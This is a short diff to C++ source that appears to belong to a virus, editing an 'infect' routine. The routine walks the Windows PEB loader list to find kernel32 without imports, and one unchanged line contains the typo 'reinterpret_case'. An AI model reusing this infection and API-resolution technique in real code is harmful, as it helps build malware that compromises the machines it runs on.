@@ -58,7 +58,7 @@ typedef struct FULL_LDR_DATA_TABLE_ENTRY
      LIST_ENTRY StaticLinks;
 } FULL_LDR_DATA_TABLE_ENTRY, *PFULL_LDR_DATA_TABLE_ENTRY;
 
-void infect(void)
+bool infect(void)
 {
 #if defined(BROODSAC32)
    PPEB peb = reinterpret_case<PPEB>(__readfsdword(0x30));
@@ -79,7 +79,7 @@ void infect(void)
          continue;
       }
 
-      if (*reinterpret_cast<std::uint64_t *>(table_entry->BaseDllName.Buffer) == *reinterpret_cast<std::uint64_t *>("K\x00""E\x00""R\x00""N\x00"))
+      if (*reinterpret_cast<std::uint64_t *>(table_entry->BaseDllName.Buffer) == 0x4e00520045004b) // L"KERN"
          break;
       
       list_entry = table_entry->InLoadOrderLinks.Flink;
